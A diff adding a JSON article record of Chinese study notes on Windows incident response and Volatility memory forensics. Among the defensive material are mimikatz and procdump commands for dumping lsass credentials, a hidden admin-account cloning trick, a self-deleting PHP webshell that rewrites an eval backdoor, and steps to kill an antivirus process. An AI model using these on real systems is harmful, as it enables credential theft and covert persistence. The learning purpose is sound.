@@ -1,0 +1,267 @@
+{
+  "slug": "forensics",
+  "title": "Forensics",
+  "summary": "围绕应急响应、内存取证与 Linux 取证整理的学习笔记。",
+  "category": "安全",
+  "html": "<h1 id=\"section-1\">Information Forensics</h1>\n<p>Arch：Windows</p>\n<h2 id=\"section-2\">0x01 Respond*</h2>\n<h3 id=\"section-3\">InformationGathering</h3>\n<pre><code class=\"language-shell\">ipconfig #查看ip信息\nnetstat -an #查看本地开放的端口服务\narp -a #arp缓存表\nroute print #查看当前路由表\nsysteminfo #显示当前系统信息\n</code></pre>\n<pre><code class=\"language-bat\">attrib /?\n#显示或更改文件属性。\n\nATTRIB [+R | -R] [+A | -A] [+S | -S] [+H | -H] [+O | -O] [+I | -I] [+X | -X] [+P | -P] [+U | -U]\n       [drive:][path][filename] [/S [/D]] [/L]\n\n  +   设置属性。\n  -   清除属性。\n  R   只读文件属性。\n  A   存档文件属性。\n  S   系统文件属性。\n  H   隐藏文件属性。\n  O   脱机属性。\n  I   无内容索引文件属性。\n  X   无清理文件属性。\n  V   完整性属性。\n  P   固定属性。\n  U   非固定属性。\n  [drive:][path][filename]\n      指定属性要处理的文件。\n  /S  处理当前文件夹及其所有子文件夹中\n      的匹配文件。\n  /D  也处理文件夹。\n  /L  处理符号链接和\n      符号链接目标的属性\n</code></pre>\n<pre><code class=\"language-bat\">attrib +R 1.txt #使用该命令后文件保存时只能另存 因为该文件只读不可修改\nattrib +R +S +H 1.txt #使用该命令后文件变为系统文件并隐藏 不可写入\nattrib -R -S -H 1.txt #消除该文件的属性\n</code></pre>\n<pre><code class=\"language-bat\">echo Hello_flag &gt; 1.txt:2.txt #此时打开1.txt发现是空文件并且大小为0kb 因为是个隐藏文件流\n</code></pre>\n<pre><code class=\"language-bat\">C:\\Users\\SxyLao1\\Downloads&gt;dir /?\n显示目录中的文件和子目录列表。\n\nDIR [drive:][path][filename] [/A[[:]attributes]] [/B] [/C] [/D] [/L] [/N]\n  [/O[[:]sortorder]] [/P] [/Q] [/R] [/S] [/T[[:]timefield]] [/W] [/X] [/4]\n\n  [drive:][path][filename]\n              指定要列出的驱动器、目录和/或文件。\n\n  /A          显示具有指定属性的文件。\n  属性         D  目录                R  只读文件\n               H  隐藏文件            A  准备存档的文件\n               S  系统文件            I  无内容索引文件\n               L  重新分析点          O  脱机文件\n               -  表示“否”的前缀\n  /B          使用空格式(没有标题信息或摘要)。\n  /C          在文件大小中显示千位数分隔符。这是默认值。用 /-C 来\n              禁用分隔符显示。\n  /D          跟宽式相同，但文件是按栏分类列出的。\n  /L          用小写。\n  /N          新的长列表格式，其中文件名在最右边。\n  /O          用分类顺序列出文件。\n  排列顺序     N  按名称(字母顺序)     S  按大小(从小到大)\n               E  按扩展名(字母顺序)   D  按日期/时间(从先到后)\n               G  组目录优先           -  反转顺序的前缀\n</code></pre>\n<pre><code class=\"language-cmd\">dir /s #查看当前目录下的系统文件\ndir /a #查看当前目录下的所有文件\n？#查看隐藏流文件的文件名\ndir /r # /R 显示文件的备用数据流\nnotepad 1.txt:2.txt #查看隐藏流文件\n</code></pre>\n<h4 id=\"section-4\">SystemPasswd</h4>\n<p>Windows系统登录的时，输入user:passwd后，从注册表SAM中读取user:passwd的hash加密进行校验，通过后将通过的hash值保存在lsass.exe中，系统登录</p>\n<p>管理员权限打开mimikatz，<a href=\"https://github.com/ParrotSec/mimikatz\" rel=\"noopener noreferrer\" target=\"_blank\">GitHub - ParrotSec/mimikatz</a><br />\n<a href=\"https://www.cnblogs.com/chenglee/p/9366399.html\" rel=\"noopener noreferrer\" target=\"_blank\">两步完成利用procdump64+mimikatz获取win用户密码 - 夏天公子 - 博客园 (cnblogs.com)</a><br />\n<a href=\"https://blog.csdn.net/netsec_steven/article/details/107257325\" rel=\"noopener noreferrer\" target=\"_blank\">mimikatz在Win10及2012系统以后的明文抓取方式_mimikatz获取密码_netsec_steven的博客-CSDN博客</a></p>\n<pre><code class=\"language-bat\">  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36\n .## ^ ##.  &quot;A La Vie, A L'Amour&quot; - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       &gt; http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz # privilege::debug\nPrivilege '20' OK\nmimikatz # sekurlsa::logonpasswords\n\nAuthentication Id : 0 ; 703667 (00000000:000abcb3)\nSession           : Interactive from 1\nUser Name         : SxyLao1\nDomain            : DESKTOP-1L1N9E3\nLogon Server      : DESKTOP-1L1N9E3\nLogon Time        : 2023/3/14 15:12:12\nSID               : S-1-5-21-4064297522-703208922-1005251153-1000\n        msv :\n         [00000003] Primary\n         * Username : SxyLao1\n         * Domain   : DESKTOP-1L1N9E3\n         * NTLM     : 9a63389440b621b692ca7707a9d3d993 #加密后的密码为NTML 不需要密码有NTML\n         * SHA1     : 4de6cf4463841a49387081cc042e9aa1b81939d8\n        tspkg :\n        wdigest :\n         * Username : SxyLao1\n         * Domain   : DESKTOP-1L1N9E3\n         * Password : (null)\n        kerberos :\n         * Username : SxyLao1\n         * Domain   : DESKTOP-1L1N9E3\n         * Password : (null)\n        ssp :\n        credman :\n        cloudap :\n\nmimikatz #\n</code></pre>\n<p>系统登录之后密码进行加密交给Isass进程进行校验处理，此时可以通过该进程抓取密码，右键创建转储文件。<br />\n打开任务管理器的进程，排序找到lsass.exe程序选中右键选择生成转储文件并打开文件所在位置得到转储文件。<br />\n或者使用如下命令获取转储文件：</p>\n<pre><code class=\"language-bat\">procdump64.exe -accepteula -ma lsass.exe lsass.dmp\n</code></pre>\n<p>得到转储文件后用mimikatz操作获取密码：</p>\n<pre><code class=\"language-shell\">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit\n</code></pre>\n<p>mimikatz也可以对dpapi进行提取，dpapi是Data Protection API，即保护数据的接口。<br />\nDPAIP使用了Master Key的东西用来加解密，但Master Key不存在磁盘上，是通过用户密码HASH加密生成。</p>\n<pre><code class=\"language-shell\">mimikatz # sekurlsa::dpapi\n\nAuthentication Id : 0 ; 999 (00000000:000003e7)\nSession           : UndefinedLogonType from 0\nUser Name         : DESKTOP-1L1N9E3$\nDomain            : WORKGROUP\nLogon Server      : (null)\nLogon Time        : 2023/3/14 15:11:33\nSID               : S-1-5-18\n         [00000000]\n         * GUID      :  {2d5f3f2e-c0c9-4a00-bf95-cba7ae761249}\n         * Time      :  2023/3/14 15:55:45\n         * MasterKey :  b3ce2c4d7868eddb7009cfeae9123ca65bf66e9f9a836cf4b269041a1a880247f60359069622f07777a45b7afe3c59b4a24ac4a5a66ed04017c05a14567e2b1b\n         * sha1(key) :  b52ff6357141ea62e5d80b7b10b7a6597168e9d5\n         [00000001]\n         * GUID      :  {72b0a00e-d09c-433e-a6c9-84f49d444371}\n         * Time      :  2023/3/14 15:17:57\n         * MasterKey :  5756344bb005cad6713a6b9a3dc2ca07bedf3e55024bab00a483532064648db57be471e8a80b08ca4a04389f06e14c1f78f2d26c7a3b086ac784824f677eb526\n         * sha1(key) :  ace8c104dc2d56428c05636a63c1db67058e41c3\n</code></pre>\n<h4 id=\"section-5\">BroswerPasswd</h4>\n<p>浏览器缓存文件一般在家目录下的<code>%localappdata%</code></p>\n<pre><code>C:\\Users\\SxyLao1\\AppData\\Local\\Google\\Chrome\\User Data\\Default\n</code></pre>\n<p>在如上路径中可以找到<code>Login Data</code>文件，使用notepad++打开，可以看见里面有类似SQL语句的内容，这是因为数据以SQLite形式存储<br />\n<code>Login Data</code>文件就是由DPAPI进行保护的，同时DPAPI也是由Master Key进行加密的，即通过mimikatz拿到Master Key即可进行解密。</p>\n<h4 id=\"section-6\">RecentFile</h4>\n<p><code>%userprofile%\\Recent</code>或者<code>Win + R</code>输入<code>recent</code><br />\n比赛的时候一般此处可能会保存一些shell文件或者线索文件</p>\n<h4 id=\"section-7\">Hosts</h4>\n<pre><code class=\"language-shell\">C:\\Windows\\System32\\drivers\\etc\\hosts\n</code></pre>\n<p>访问网址的时候首先就会来查询Hosts文件，如果内有记录就会直接进入，否则就会进行DNS域名解析等一系列操作。</p>\n<h4 id=\"section-8\">Middleware</h4>\n<p><a href=\"http://www.d99net.net/\" rel=\"noopener noreferrer\" target=\"_blank\">D盾防火墙 (d99net.net)</a><br />\n需要对中间件的源代码查杀<code>Shell</code>，推荐工具<code>D盾</code></p>\n<h4 id=\"section-9\">UserManager</h4>\n<pre><code class=\"language-cmd\">whoami #查看当前用户吗\nwhoami /all #查看当前用户的所有信息\nnet user #列出系统用户信息\n</code></pre>\n<p><code>wmi</code>是一个 windows 管理组件，<code>Windows Management Instrumentation</code>是基于 Windows 的操作系统上管理数据和操作的基础结构。可以编写 WMI 脚本或应用程序来自动执行远程计算机上的任务。</p>\n<pre><code class=\"language-bat\">wmic /all\nwmic process get * #获取所有的进程信息\nwmic SYSACCOUNT get * #获取系统账户所有信息\nwmic SYSACCOUNT get name,sid #获取系统账户名和sid值\nwmic USERACCOUNT get name,sid #获取用户账户名和sid值\nName                SID #这条命令写一下输出结果 SID最后一个'-'后的即为编号 数值越小权限越大 Administrator权限最高\nAdministrator       S-1-5-21-3710927514-625496743-2172921099-500\nDefaultAccount      S-1-5-21-3710927514-625496743-2172921099-503\nGuest               S-1-5-21-3710927514-625496743-2172921099-501\nSxyLao1             S-1-5-21-3710927514-625496743-2172921099-1001\nWDAGUtilityAccount  S-1-5-21-3710927514-625496743-2172921099-504\n</code></pre>\n<pre><code class=\"language-shell\">net user test$ test /add \n#添加一个test用户 密码为test '$'表示隐藏账户 net user命令无法查看到该用户 因为是隐藏账户 下面演示如何查看该隐藏账户\n</code></pre>\n<p><code>Win + R</code>输入<code>regedit</code>打开注册表来到<code>\\HKEY_LOCAL_MACHINE\\SAM\\SAM</code>路径下选中右键SAM，为当前使用的用户在SAM文件文件权限上增加完全控制的权限。点击<code>添加</code>，将用户名输入进<code>输入对象名来选择(示例)(E):</code>中，然点击<code>检查名称</code>，点击确定完成添加。权限在<code>完全控制</code>上打对勾，应用并确认。<br />\n在菜单栏的查看中点击刷新或者按F5刷新，如此当前登录的用户便可以查看到SAM文件下的内容了。</p>\n<pre><code class=\"language-reg\">\\HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\n</code></pre>\n<p><img src=\"article-assets/forensics/85d9d7f67528f38c13ee.png\" alt=\"image-20230314194631443\" loading=\"lazy\" decoding=\"async\" referrerpolicy=\"no-referrer\" /></p>\n<p><img src=\"article-assets/forensics/c2182557ba41d760472c.png\" alt=\"image-20230314195135505\" loading=\"lazy\" decoding=\"async\" referrerpolicy=\"no-referrer\" /></p>\n<p><strong>当隐藏账户被创建后便可以从此处的注册表查看，如下图</strong></p>\n<p><img src=\"article-assets/forensics/9d25dea9e5d459b73f26.png\" alt=\"image-20230314200101032\" loading=\"lazy\" decoding=\"async\" referrerpolicy=\"no-referrer\" /></p>\n<p>或者在<code>控制面板 &gt; 用户账户 &gt; 用户账户 &gt; 管理账户</code>中查看隐藏账户<br />\n<img src=\"article-assets/forensics/819251ed72d162634cde.png\" alt=\"image-20230314200449507\" loading=\"lazy\" decoding=\"async\" referrerpolicy=\"no-referrer\" /></p>\n<p><strong>克隆用户</strong><br />\n如果不希望控制面板被看到隐藏用户，可以回到刚才的注册表Names位置，将test用户的注册表导出，将其SID码改为Adminstrator的\\xF4\\x01(即01F4)，然后在 cmd 中将test用户删除 net user test$ /del。这时控制面板中的隐藏用户将会消失，接着将刚才到处并修改的test用户注册表文件xxx.reg导入到adminstrator中。此时将拥有一个有着Adminstrator权限的test用户使用，并且不会被作为隐藏用户查到</p>\n<h4 id=\"section-10\">NetworkConnections</h4>\n<p><a href=\"https://blog.csdn.net/petershina/article/details/16981605?ops_request_misc=%7B%22request%5Fid%22%3A%22167879775816800225551393%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167879775816800225551393&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-16981605-null-null.142%5Ev73%5Epc_search_v2,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&amp;utm_term=%E5%B8%B8%E8%A7%81Port&amp;spm=1018.2226.3001.4187\" rel=\"noopener noreferrer\" target=\"_blank\">常见端口号一览（详细）_8989端口_petershina的博客-CSDN博客</a></p>\n<pre><code class=\"language-bat\">netstat -an #查看当前端口开放情况 协议、本地地址、外部地址、状态\nnetstat -ant #查看当前端口开放情况 协议、本地地址、外部地址、状态、卸载状态\n</code></pre>\n<p>[常见端口]<br />\nWeb相关：80(Http) 8080(Web服务) 443(Https) 8000-9000<br />\n数据库相关：3306(Mysql) 1433(SQL Server) 1521(Orcal) <strong>6379(Redis 未授权漏洞)</strong><br />\n服务相关：22(ssh) 21(ftp) <strong>445(smb ms17_010 smb连接共享)</strong></p>\n<h4 id=\"section-11\">ProcessAnalyse</h4>\n<pre><code class=\"language-bat\">netstat -ano #查看当前端口开放情况 协议、本地地址、外部地址、状态、PID\ntasklist /svc #查看当前服务程序信息\n#netstat中显示的PID号与tasklist的PID对照即可找到对应程序 再通过程序找到它的绝对路径\ntasklist /svc | findstr &quot;10452&quot;\n</code></pre>\n<h4 id=\"section-12\">StartsAutomatically</h4>\n<p>注册表，服务，定时任务/计划任务，启动项可以做到自动启动(持久化控制)</p>\n<p>当前用户下的自动启动文件夹，<code>C:\\Users\\SxyLao1\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code><br />\n<code>Win + R</code>输入<code>msconfig</code>进入系统配置，可以查看到系统的自启动文件夹</p>\n<h5 id=\"section-13\">定时任务/计划任务</h5>\n<p>at (Windwos7及以前版本可用)<code>&amp;</code>schtasks(迭代后使用该程序进行定时任务)`</p>\n<pre><code class=\"language-powershell\">at 11:15:37 calc.exe\nat #查看定时任务\nat 1 /del #删除1号定时任务\n</code></pre>\n<p><code>Win + R</code>输入<code>schtasks</code>进入定时任务管理界面</p>\n<pre><code class=\"language-powershell\">PS C:\\Windows\\system32&gt; schtasks /?\nSCHTASKS /parameter [arguments]\n描述:\n    允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任\n    务。\n参数列表:\n    /Create         创建新计划任务。\n    /Delete         删除计划任务。\n    /Query          显示所有计划任务。\n    /Change         更改计划任务属性。\n    /Run            按需运行计划任务。\n    /End            中止当前正在运行的计划任务。\n    /ShowSid        显示与计划的任务名称相应的安全标识符。\n    /?              显示此帮助消息。\nExamples:\n    SCHTASKS\n    SCHTASKS /?\n    SCHTASKS /Run /?\n    SCHTASKS /End /?\n    SCHTASKS /Create /?\n    SCHTASKS /Delete /?\n    SCHTASKS /Query  /?\n    SCHTASKS /Change /?\n    SCHTASKS /ShowSid /?\n</code></pre>\n<pre><code class=\"language-powershell\">schtasks /create /? #查看create选项后可选择的参数\n ==&gt; 创建计划任务 &quot;gaming&quot;，每天从 12:00 点开始到\n        14:00 点自动结束，运行 freecell.exe。\n\n        SCHTASKS /Create /SC DAILY /TN gaming /TR c:\\freecell /ST 12:00\nschtasks /create /sc minute /tn test /tr calc.exe #每一分钟执行一次名为test定时任务 任务中执行程序为calc.exe\nschtasks /query /tn test #查询名为test的定时任务\n\n文件夹: \\\n任务名                                   下次运行时间           模式\n======================================== ====================== ===============\ntest                                     2023/3/15 11:30:00     就绪\nschtasks /delete /tn test #删除名为test的定时任务\n警告: 确实要删除任务 &quot;test&quot; 吗 (Y/N )? y\n成功: 计划的任务 &quot;test&quot; 被成功删除。\nschtasks /delete /f /tn test #强行删除名为test的定时任务不需要询问\n</code></pre>\n<h5 id=\"section-14\">注册表</h5>\n<blockquote>\n<p>64位系统<br />\nHKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run<br />\nHKCU\\Software\\Microsoft\\Windows\\Currentversion\\Run<br />\nHKCU\\Software\\Microsoft\\Windows\\Currentversion\\RunServices</p>\n<p>32位系统<br />\nHKLM\\Software\\Wow6432Node\\Microsoft\\Windows\\Currentversion\\Run<br />\nHKCU\\Software\\Wow6432Node\\Microsoft\\Windows\\Currentversion\\Run<br />\nHKCU\\Software\\Wow6432Node\\Microsoft\\Windows\\Currentversion\\RunServices</p>\n</blockquote>\n<p>一次性启动项，下次启动会自动删除</p>\n<blockquote>\n<p>64位系统<br />\nHKLM\\Software\\Microsoft\\Windows\\Currentversion\\RunOnce<br />\nHKCU\\Software\\Microsoft\\Windows\\Currentversion\\RunOnce<br />\nHKCU\\Software\\Microsoft\\Windows\\Currentversion\\RunServicesOnce</p>\n<p>32位系统<br />\nHKLM\\Software\\Wow6432Node\\Microsoft\\Windows\\Currentversion\\RunOnce<br />\nHKCU\\Software\\Wow6432Node\\Microsoft\\Windows\\Currentversion\\RunOnce<br />\nHKCU\\Software\\Wow6432Node\\Microsoft\\Windows\\Currentversion\\RunServicesOnce</p>\n</blockquote>\n<pre><code class=\"language-powershell\">PS C:\\Windows\\system32&gt; reg query HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run\n#以此查找黑客开机自启的后门\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\Currentversion\\Run\n    SecurityHealth    REG_EXPAND_SZ    %windir%\\system32\\SecurityHealthSystray.exe\n    VMware User Process    REG_SZ    &quot;C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe&quot; -n vmusr\n    Sysdiag    REG_SZ    &quot;C:\\Program Files (x86)\\Huorong\\Sysdiag\\bin\\HipsTray.exe&quot;\n</code></pre>\n<h5 id=\"section-15\">服务</h5>\n<p><code>Win + R</code>输入<code>services.msc</code>打开服务管理</p>\n<pre><code class=\"language-cmd\">sc /? #SC 是用来与服务控制管理器和服务进行通信的命令行程序\nsc create testservices binpath=&quot;calc.exe&quot; binpath=&quot;calc.exe&quot; start=&quot;auto&quot; #创建testservices服务 路径calc.exe 自动启动\nsc query testservices #查询名为testservices的服务信息\nsc start testservices #启动名为testservices的服务信息\nsc delete testservices #删除名为testservices的服务信息\n</code></pre>\n<p>Windows最重要的几个模块：<br />\nrundll32.exe：加载和运行32位动态链接库。<br />\ngdi32.dll：系统用来绘制图形窗口的dll库。</p>\n<h4 id=\"section-16\">FileAnalysis</h4>\n<p><a href=\"https://www.virustotal.com/gui/home/upload\" rel=\"noopener noreferrer\" target=\"_blank\">VirusTotal - Home</a><br />\n<a href=\"https://s.threatbook.com/\" rel=\"noopener noreferrer\" target=\"_blank\">微步云沙箱:https://s.threatbook.com</a></p>\n<h3 id=\"section-17\">MaintainTheFirstScene</h3>\n<p>尽可能实现的情况下去维持第一现场，无论谁被打穿了都会慌，一慌就推卸责任甚至消灭痕迹，这无疑帮助了攻击者完成了渗透的最后一步。&quot;第一&quot;指的是最先发现情况的人，这个人所说的情况。发现的被攻陷的主体，最好用镜像把系统和流量先扒下来。时间越延迟，这个&quot;第一&quot;事实的失真率越高，所以要安服和应急人员做好配合。</p>\n<h3 id=\"section-18\">LogTypeOfAnalysis</h3>\n<p>Web入侵，网站被上传了黑链(跳转到黄赌毒网站)，往往伴随着大量的webshell，系统入侵；<br />\n勒索病毒，尝试公开解密或者查询家族，大多数不可解，只能尝试溯源，排查风险；<br />\n挖矿病毒，多为门罗币挖矿，从进程类进行查杀，排查可能存在被暴力破解进行感染；<br />\n木马程序，远控程序(Cobaltstrike，msf)，<br />\n其他，例如DDOS，ARP攻击等。</p>\n<h2 id=\"section-19\">0x02 Blocking</h2>\n<p>阻断只有三步：关站、关服务、拔网线。<br />\n这一步是应急响应的最终目的，无论实施过程如何、无论使用什么工具都必须保证被保护与沦陷方的隔离。<br />\n隔离核心资产是为了做到三个原则：保护、避害、不损害。<br />\n隔离受害主体(群体)是为了保护第一现场、收集攻击者信息等。</p>\n<h2 id=\"section-20\">0x03 Analyse*</h2>\n<h3 id=\"section-21\">1)Data、Traffic、SampleAnalysis</h3>\n<p>(1) 是否有异常进程、用户<br />\n(2) 敏感端口开放情况<br />\n(3) 密码强度<br />\n(4) 日志分析<br />\n(5) 异常启动项、服务、计划任务<br />\n(6) 注册表信息<br />\n(7) 其他</p>\n<h3 id=\"section-22\">2)Behavior Analysis &amp; Restore Attack Process</h3>\n<p><a href=\"https://download.sysinternals.com/files/Autoruns.zip\" rel=\"noopener noreferrer\" target=\"_blank\">Autoruns</a><br />\nTCPview<br />\nProcEXP<br />\nPCHunter<br />\n<a href=\"https://www.antiy.com/tools/Atool.rar\" rel=\"noopener noreferrer\" target=\"_blank\">Atool</a> &lt;== 网址</p>\n<p>从行为出发，还原攻击路径，推演攻击过程。<br />\n行为分析基于三大件分析，结合系统表现出来的情况做分析，例如：启动项、启动脚本、进程、内存等。<br />\n还原攻击过程需要对攻击大致的情况有一个综合判断，可以理解为<code>威胁模型建立(SDL)</code>，必须具备渗透能力，在此基础上放入沙箱重新浮现攻击过程，对后续的步骤提供帮助。</p>\n<h2 id=\"section-23\">0x04 Clean*</h2>\n<h3 id=\"section-24\">1)Non-adversarial</h3>\n<p>在不存在对抗的情况下，最极端就是全盘重装，稍次就是数据迁移后对系统盘重装。在普通比赛情况下，可以进行针对性的杀进程、删文件、杀软清除。</p>\n<h3 id=\"section-25\">2)Adversarial</h3>\n<h4 id=\"section-26\">不死马</h4>\n<pre><code class=\"language-php\">&lt;?php //最简单的不死马\n    ignore_user_abort(true); #该函数如果设置为TURE及与用户断开后脚本将正常运行 默认情况下是FALSE断开程序也停止\n\tset_time_limit(0); #程序将不会有超时\n\tunlink(__FILE__);\n\t$file = '3.php';\n\t$code = '&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;laldc91c907325c69271ddf0c944bc72&quot;){@eval($_POST[a]);}?&gt;';\n\t//pass=pass\n\twhile (1) {\n        file_put_contents($file, $code); #死循环向3.php写入木马\n        system('touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php');\n        usleep(5000);\n    }\n?&gt;\n</code></pre>\n<p>不死马对抗思路：<br />\n写一个死循环删除文件的脚本、<br />\n对写入木马的文件夹修改&quot;写&quot;权限、<br />\n停止Apache服务删除木马再重启不死马就不会再写文件了</p>\n<h4 id=\"section-27\">高权限启动</h4>\n<pre><code class=\"language-cmd\">taskkill /? #查询杀死进程命令用法\ntaskkill /f /im hipstray.exe #强制 指定终止进程名称\n</code></pre>\n<p><a href=\"https://processhacker.sourceforge.io/\" rel=\"noopener noreferrer\" target=\"_blank\">Overview - Process Hacker (sourceforge.io)</a></p>\n<p>二进制程序以0环权限运行，3环权限无法杀死，使用如上链接中的工具。Process Hacker是运行在0环上的进程工具，以<strong>管理员权限</strong>打开可以直接杀死火绒进程。</p>\n<h2 id=\"section-28\">0x05 Reinforce*</h2>\n<h1 id=\"section-29\">Memory Forensics</h1>\n<p><a href=\"https://www.volatilityfoundation.org/releases\" rel=\"noopener noreferrer\" target=\"_blank\">Release Downloads | Volatility Foundation</a><br />\n[<a href=\"https://www.cnblogs.com/weird1522/p/15388594.html\" rel=\"noopener noreferrer\" target=\"_blank\">volatility源码版本安装 - Weird请221522 - 博客园 (cnblogs.com)</a><br />\n<a href=\"https://github.com/volatilityfoundation/Volatility/wiki/Command-Reference\" rel=\"noopener noreferrer\" target=\"_blank\">Command Reference · volatilityfoundation/volatility Wiki · GitHub</a></p>\n<pre><code class=\"language-cmd\">volatility_2.6_win64_standalone -h #查看vlaitlity取证工具的命令手册\nvolatility.exe -f test.vmem imageinfo #读取基本信息\n\nvolatility -f XpProTesting-Snapshot4.vmem imageinfo #镜像信息\nVolatility Foundation Volatility Framework 2.6\nINFO    : volatility.debug    : Determining profile based on KDBG search... #KDBG跟内核相关 不用管\n          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86) #排最前的是匹配可能性最大的系统 比赛就写第一个\n                     AS Layer1 : IA32PagedMemory (Kernel AS)\n                     AS Layer2 : FileAddressSpace (F:\\Vmpc\\Windows\\XP_Testing\\XpProTesting-Snapshot4.vmem)\n                      PAE type : No PAE\n                           DTB : 0x39000L\n                          KDBG : 0x80538d60L\n          Number of Processors : 1\n     Image Type (Service Pack) : 0\n                KPCR for CPU 0 : 0xffdff000L\n             KUSER_SHARED_DATA : 0xffdf0000L\n           Image date and time : 2022-10-25 15:32:10 UTC+0000\n     Image local date and time : 2022-10-25 23:32:10 +0800\n     \nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 pslist #指定系统并查询进程列表\nVolatility Foundation Volatility Framework 2.6\nOffset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit\n---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------\n0x81fbd838 System                    4      0     51      215 ------      0\n0x81ad3020 smss.exe                340      4      3       21 ------      0 2022-10-25 15:16:54 UTC+0000\n0x81b10408 csrss.exe               472    340     11      366      0      0 2022-10-25 15:16:54 UTC+0000\n0x81eadda8 winlogon.exe            624    340     19      456      0      0 2022-10-25 15:16:55 UTC+0000\n0x81eb0560 services.exe            668    624     20      302      0      0 2022-10-25 15:16:55 UTC+0000\n0x81bab020 lsass.exe               680    624     23      315      0      0 2022-10-25 15:16:55 UTC+0000\n0x81ed94c0 vmacthlp.exe            832    668      1       27      0      0 2022-10-25 15:16:55 UTC+0000\n0x81ec87f8 svchost.exe             872    668      9      243      0      0 2022-10-25 15:16:55 UTC+0000\n0x81e535d8 svchost.exe             972    668     80     1279      0      0 2022-10-25 15:16:55 UTC+0000\n0x81f17020 svchost.exe            1044    668      4       70      0      0 2022-10-25 15:16:55 UTC+0000\n0x81da97f0 svchost.exe            1060    668     13      153      0      0 2022-10-25 15:16:55 UTC+0000\n0x81e6ad80 spoolsv.exe            1296    668     10      131      0      0 2022-10-25 15:16:56 UTC+0000\n0x81e081c0 explorer.exe           1632   1580     11      289      0      0 2022-10-25 15:17:13 UTC+0000\n0x81a38a58 vmtoolsd.exe           1760   1632      6      205      0      0 2022-10-25 15:17:13 UTC+0000\n0x81c03b30 ctfmon.exe             1772   1632      1       52      0      0 2022-10-25 15:17:13 UTC+0000\n0x816a5880 msmsgs.exe             1784   1632      2      128      0      0 2022-10-25 15:17:13 UTC+0000\n0x81d686a0 VGAuthService.e        1948    668      2       63      0      0 2022-10-25 15:17:15 UTC+0000\n0x81e32b30 vmtoolsd.exe           2012    668      7      228      0      0 2022-10-25 15:17:15 UTC+0000\n0x81b48b68 wmiprvse.exe            424    872      9      190      0      0 2022-10-25 15:17:23 UTC+0000\n0x81a9fb90 cmd.exe                 468   1632      1       22      0      0 2022-10-25 15:17:25 UTC+0000\n0x81b78da8 conime.exe              404    468      1       24      0      0 2022-10-25 15:17:25 UTC+0000\n0x81d58938 cmd.exe                1188   1632      1       18      0      0 2022-10-25 15:18:23 UTC+0000\n0x81bb89a0 ntvdm.exe              1200   1188      3       38      0      0 2022-10-25 15:18:30 UTC+0000\n\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 pstree\nVolatility Foundation Volatility Framework 2.6\nName                                                  Pid   PPid   Thds   Hnds Time\n-------------------------------------------------- ------ ------ ------ ------ ----\n 0x81fbd838:System                                      4      0     51    215 1970-01-01 00:00:00 UTC+0000\n. 0x81ad3020:smss.exe                                 340      4      3     21 2022-10-25 15:16:54 UTC+0000\n.. 0x81b10408:csrss.exe                               472    340     11    366 2022-10-25 15:16:54 UTC+0000\n.. 0x81eadda8:winlogon.exe                            624    340     19    456 2022-10-25 15:16:55 UTC+0000\n... 0x81bab020:lsass.exe                              680    624     23    315 2022-10-25 15:16:55 UTC+0000\n... 0x81eb0560:services.exe                           668    624     20    302 2022-10-25 15:16:55 UTC+0000\n.... 0x81e6ad80:spoolsv.exe                          1296    668     10    131 2022-10-25 15:16:56 UTC+0000\n.... 0x81d686a0:VGAuthService.e                      1948    668      2     63 2022-10-25 15:17:15 UTC+0000\n.... 0x81ed94c0:vmacthlp.exe                          832    668      1     27 2022-10-25 15:16:55 UTC+0000\n.... 0x81e535d8:svchost.exe                           972    668     80   1279 2022-10-25 15:16:55 UTC+0000\n.... 0x81da97f0:svchost.exe                          1060    668     13    153 2022-10-25 15:16:55 UTC+0000\n.... 0x81e32b30:vmtoolsd.exe                         2012    668      7    228 2022-10-25 15:17:15 UTC+0000\n.... 0x81ec87f8:svchost.exe                           872    668      9    243 2022-10-25 15:16:55 UTC+0000\n..... 0x81b48b68:wmiprvse.exe                         424    872      9    190 2022-10-25 15:17:23 UTC+0000\n.... 0x81f17020:svchost.exe                          1044    668      4     70 2022-10-25 15:16:55 UTC+0000\n 0x81e081c0:explorer.exe                             1632   1580     11    289 2022-10-25 15:17:13 UTC+0000\n. 0x81d58938:cmd.exe                                 1188   1632      1     18 2022-10-25 15:18:23 UTC+0000\n.. 0x81bb89a0:ntvdm.exe                              1200   1188      3     38 2022-10-25 15:18:30 UTC+0000\n. 0x81a38a58:vmtoolsd.exe                            1760   1632      6    205 2022-10-25 15:17:13 UTC+0000\n. 0x81a9fb90:cmd.exe                                  468   1632      1     22 2022-10-25 15:17:25 UTC+0000\n.. 0x81b78da8:conime.exe                              404    468      1     24 2022-10-25 15:17:25 UTC+0000\n. 0x81c03b30:ctfmon.exe                              1772   1632      1     52 2022-10-25 15:17:13 UTC+0000\n. 0x816a5880:msmsgs.exe                              1784   1632      2    128 2022-10-25 15:17:13 UTC+0000\n</code></pre>\n<p><img src=\"article-assets/forensics/d826b554aa353d76e637.png\" alt=\"image-20230316154616371\" loading=\"lazy\" decoding=\"async\" referrerpolicy=\"no-referrer\" 